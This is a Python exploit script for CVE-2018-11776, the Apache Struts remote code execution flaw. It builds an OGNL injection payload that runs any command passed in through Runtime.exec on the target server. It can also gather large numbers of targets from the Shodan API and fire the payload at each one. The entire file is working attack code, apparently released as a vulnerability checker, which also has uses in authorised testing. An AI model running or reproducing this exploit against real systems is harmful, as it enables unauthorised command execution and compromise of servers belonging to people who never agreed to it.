import re
import json
import time
import urllib
import argparse

import requests
requests.packages.urllib3.disable_warnings()


__author__ = "Ekultek"
__twitter__ = "@stay__salty"
__description__ = "Check hosts for CVE-2018-11776"


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument("-H", "--host", dest="hostTarget", metavar="IP", help="pass a host to target")
        parser.add_argument("-a", "--agent", dest="userAgent", metavar="AGENT", help="pass a User-Agent")
        parser.add_argument("-p", "--proxy", dest="proxyToUse", metavar="PROXY", help="pass a proxy")
        parser.add_argument("-s", "--shodan", dest="shodanKey", metavar="API-KEY", help="pass your shodan API key")
        parser.add_argument("-c", "--connect", dest="connectShodan", action="store_true", default=False,
                            help="connect to Shodan API and find hosts")
        parser.add_argument("-C", "--command", dest="commandToExecute", metavar="COMMAND",
                            help="pass a command to execute")
        parser.add_argument("-q", "--query", dest="searchQuery", metavar="QUERY", help="pass a search query")
        parser.add_argument("-t", "--path", dest="targetPath", metavar="PATH", help="provide a path to the target")
        return parser.parse_args()


def create_payload(command):
    """
    generate the payload for the URL
    payload discovered by jas502n (https://github.com/jas502n/St2-057)
    """
    payload = "${(#_memberAccess[\"allowStaticMethodAccess\"]=true,"
    payload += "#a=@java.lang.Runtime@getRuntime().exec(\"{}\").getInputStream(),".format(command)
    payload += "#b=new java.io.InputStreamReader(#a),"
    payload += "#c=new java.io.BufferedReader(#b),#d=new char[51020],"
    payload += "#c.read(#d),#sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
    payload += "#sbtest.println(#d),#sbtest.close())}/actionChain1.action"
    return urllib.quote_plus(payload)


def get_page(url, payload, proxy=None, user_agent=None):
    """
    check if the URL is vulnerable or not
    """
    session = requests.session()
    session.proxies = {"http": proxy, "https": proxy}
    session.headers["User-Agent"] = user_agent
    payloaded_url = "{}{}".format(url, payload)
    try:
        req = session.get(payloaded_url, verify=False, timeout=5)
        time.sleep(1.7)  # need to sleep to give execution time to run
        status = req.status_code
        if status == 302:
            return True
        return False
    except Exception:
        return False


def convert_url(host):
    """
    add http:// to the URL
    """
    checker = re.compile(r"http(s)?.//")
    if checker.search(host) is not None:
        retval = "http://{}".format(host.split("://")[-1])
    else:
        retval = "http://{}".format(host)
    return retval


def shodan_search(api_key, query):
    """
    search Shodan for targets
    """
    shodan_url = "https://api.shodan.io/shodan/host/search?key={token}&query={query}"
    discovered_hosts = set()
    error_retval = None
    try:
        req = requests.get(shodan_url.format(token=api_key, query=query))
        json_data = json.loads(req.content)
        for match in json_data["matches"]:
            discovered_hosts.add(match["ip_str"])
        return discovered_hosts
    except Exception:
        return error_retval


def check_opts(opts):
    """
    check all the arguments and create a dict to use for the arguments
    """
    retval = {}
    if opts.hostTarget is None and not opts.connectShodan:
        print("[!] no target supplied `-H` and no Shodan connection supplied `-c`")
        exit(-1)
    if opts.connectShodan and opts.shodanKey is None:
        print("[!] no Shodan API key supplied `-s <KEY>`")
        exit(-1)

    if opts.targetPath is None:
        print("[!] no path provided on target, this will likely fail")
        retval["path"] = None
    else:
        retval["path"] = opts.targetPath

    if opts.userAgent is None:
        retval["agent"] = "Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) " \
                          "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100"
    else:
        retval["agent"] = opts.userAgent
        print("[+] configuring User-Agent: '{}'".format(opts.userAgent))
    if opts.proxyToUse is None:
        retval["proxy"] = None
    else:
        print("[+] configuring proxy: {}".format(opts.proxyToUse))
        retval["proxy"] = opts.proxyToUse
    if opts.searchQuery is None:
        retval["query"] = "struts"
    else:
        print("[+] using provided query: '{}'".format(opts.searchQuery))
        retval["query"] = opts.searchQuery
    if opts.commandToExecute is None:
        retval["command"] = "calc"
    else:
        print("[+] configuring command: '{}'".format(opts.commandToExecute))
        retval["command"] = opts.commandToExecute
    return retval


def main():
    """
    main function
    """
    print("\n{}\n-Author: {}\n--Twitter: {}\n---Description: {}\n{}\n".format(
        "-" * 45, __author__, __twitter__, __description__, "-" * 45
    ))
    opts = Parser().optparse()
    arguments = check_opts(opts)
    if opts.connectShodan:
        if opts.shodanKey is not None:
            print("[+] pulling hosts from Shodan API")
            hosts = list(shodan_search(opts.shodanKey, arguments["query"]))
        else:
            print("[!] no API key supplied `-s <KEY>`")
            exit(-1)
    if opts.hostTarget is not None:
        hosts = [opts.hostTarget]
    print("[+] checking a total of {} hosts\n".format(len(hosts)))
    for i, host in enumerate(hosts, start=1):
        print("[+] checking for CVE-2018-11776 on '{}' ({})".format(host, i))
        host = convert_url(host)
        host = "{}{}".format(host, arguments["path"] if arguments["path"] is not None else "")
        payload = create_payload(arguments["command"])
        results = get_page(host, payload, proxy=arguments["proxy"], user_agent=arguments["agent"])
        if results:
            print("[+] host: '{}' is likely vulnerable\n".format(host))
        else:
            print("[x] host: '{}' is likely NOT vulnerable\n".format(host))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[!] user quit")
